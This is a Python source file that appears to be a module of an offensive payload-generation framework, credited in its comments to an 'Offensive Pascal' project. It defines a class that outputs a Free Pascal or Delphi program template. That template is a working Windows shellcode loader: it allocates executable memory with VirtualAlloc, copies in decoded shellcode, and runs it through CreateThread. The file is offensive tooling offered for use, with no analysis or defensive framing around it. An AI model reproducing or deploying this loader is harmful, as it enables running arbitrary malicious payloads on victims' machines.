class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['Classes', 'windows', 'sysutils']

    def compilerOptions(self) -> list[str]:
        return []

    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
        return f"""
{{
    this one is part of repo published on github under the name of Offensive Pascal
    Pascal is a great and still up to date :)
    these projects can be compilied using FreePascal (FPC)
    or Delphi

    author : @zux0x3a
    site :   0xsp.com / ired.dev

    https://github.com/0xsp-SRD/OffensivePascal

}}

program output;

{{$mode delphi}}

uses {imports};

{codeblocks}

procedure main;

var
    shellcode : array of byte;
    hThread: Handle;
    addr: Pointer;
    ThreadId: LongWord;

begin
    
    {transformers}

    addr := VirtualAlloc(nil, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    CopyMemory(addr,shellcode,{shellcodeSize});
    hThread := CreateThread(nil, 0, addr, nil, 0, ThreadId);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
end;

begin
    main;
end.
"""